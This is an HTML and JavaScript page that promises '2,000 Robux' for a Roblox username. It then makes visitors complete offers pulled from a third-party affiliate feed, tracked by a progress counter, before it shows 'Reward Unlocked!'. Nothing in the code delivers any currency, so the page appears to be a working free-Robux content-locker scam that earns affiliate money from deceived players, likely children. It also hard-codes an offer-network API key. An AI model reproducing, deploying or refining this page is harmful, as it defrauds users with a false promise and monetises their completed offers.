<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Claim Your Reward</title>

<style>
html,body{
  margin:0;
  padding:0;
  height:100%;
  width:100%;
  font-family:Arial, Helvetica, sans-serif;
  background: radial-gradient(circle at top,#0d2d7a,#020617 80%);
  color:white;
  display:flex;
  justify-content:center;
  align-items:center;
}

#step1{
  display:flex;
  flex-direction:column;
  gap:18px;
  align-items:center;
  background:rgba(0,90,255,0.25);
  padding:45px;
  border-radius:20px;
  box-shadow:0 0 60px rgba(0,200,255,0.8);
}

.input-wrapper{
  position:relative;
  width:270px;
}

.input-wrapper img{
  position:absolute;
  left:12px;
  top:50%;
  transform:translateY(-50%);
  width:22px;
  height:22px;
}

.input-wrapper input{
  width:100%;
  padding:14px 14px 14px 48px;
  border-radius:10px;
  border:1px solid #00c3ff;
  background:rgba(0,150,255,0.15);
  color:white;
  box-sizing:border-box;
}

.locked{
  pointer-events:none;
}

button{
  padding:14px;
  border-radius:10px;
  border:none;
  background:linear-gradient(90deg,#00b7ff,#00f2ff);
  color:white;
  font-weight:bold;
  cursor:pointer;
  width:280px;
}

.quest-box{
  display:none;
  flex-direction:column;
  background:rgba(0,90,255,0.3);
  border-radius:22px;
  padding:35px;
  width:440px;
  box-shadow:0 0 70px rgba(0,220,255,1);
}

.offer{
  background:linear-gradient(90deg,#00b7ff,#00ffff);
  padding:15px;
  margin-bottom:14px;
  border-radius:14px;
  cursor:pointer;
  text-align:center;
}
</style>
</head>
<body>

<div id="step1">
  <div style="font-size:40px;font-weight:bold;color:#00eaff;">hzm</div>

  <!-- Robux -->
  <div class="input-wrapper">
    <img src="https://cdn.discordapp.com/attachments/1472545291507859513/1474767798499541175/960px-Robux_2019_Logo_gold.svg.png?ex=699b0c0b&is=6999ba8b&hm=c268c5e4972aa9bedfe44b995e5e145f3dc51dab442fd9594d9fb0c89c31d6d4">
    <input type="text" value="2,000 Robux" class="locked" readonly>
  </div>

  <!-- Username -->
  <div class="input-wrapper">
    <img src="https://cdn.discordapp.com/attachments/1472545291507859513/1474768345214746676/Roblox_Verification_Badge.svg.png?ex=699b0c8d&is=6999bb0d&hm=074c528f113d675120de5af274f9522ad98abc40d97cae6b24434008474aa85f">
    <input type="text" id="usernameInput" placeholder="Enter Roblox Username">
  </div>

  <button id="redeemBtn">Continue</button>
  <div id="errorMsg" style="color:#ff4d6d;height:18px;"></div>
</div>

<div class="quest-box" id="questBox">
  <h2 style="text-align:center;color:#00ffff;">Claim Your Reward âœ¨</h2>

  <div id="progressText" style="text-align:center;margin-bottom:15px;font-weight:bold;color:#00ffff;">
    Offers Completed: 0/2
  </div>

  <div id="offersContainer"></div>
</div>

<script>
const redeemBtn=document.getElementById("redeemBtn");
const usernameInput=document.getElementById("usernameInput");
const errorMsg=document.getElementById("errorMsg");
const step1=document.getElementById("step1");
const questBox=document.getElementById("questBox");
const offersContainer=document.getElementById("offersContainer");

let currentUser = "";

redeemBtn.onclick=()=>{
  const username=usernameInput.value.trim();
  if(!username){
    errorMsg.textContent="Enter a username";
    return;
  }

  currentUser = username;
  errorMsg.textContent="";
  redeemBtn.disabled=true;
  redeemBtn.textContent="Loading...";

  setTimeout(()=>{
    step1.style.display="none";
    questBox.style.display="flex";
    fetchOffers();
    checkProgress();
    setInterval(checkProgress,5000);
  },1500);
};

function fetchOffers(){
  const apiKey="4ae12a8fe006e35d228f7d24ff8d2729";
  const apiUrl=`https://d1y3y09sav47f5.cloudfront.net/public/offers/feed.php?user_id=655069&api_key=${apiKey}&s1=${encodeURIComponent(currentUser)}&s2=`;

  offersContainer.innerHTML="Loading offers...";

  fetch(apiUrl)
    .then(res=>res.json())
    .then(data=>{
      let offers=[];
      if(Array.isArray(data)) offers=data;
      else if(data.offers) offers=data.offers;
      else if(data.data?.offers) offers=data.data.offers;

      if(!offers.length){
        offersContainer.innerHTML="No offers available.";
        return;
      }

      offersContainer.innerHTML="";
      offers.forEach((offer,i)=>{
        const div=document.createElement("div");
        div.className="offer";
        div.textContent=offer.name || `Offer ${i+1}`;
        div.onclick=()=>{ if(offer.url) window.open(offer.url,"_blank"); };
        offersContainer.appendChild(div);
      });
    })
    .catch(()=>{
      offersContainer.innerHTML="Failed to load offers.";
    });
}

function checkProgress(){
  fetch(`/api/progress?user=${currentUser}`)
    .then(res=>res.json())
    .then(data=>{
      const completed = data.completed || 0;
      document.getElementById("progressText").textContent =
        `Offers Completed: ${completed}/2`;

      if(completed >= 2){
        alert("ðŸŽ‰ Reward Unlocked!");
      }
    });
}
</script>

</body>
</html>
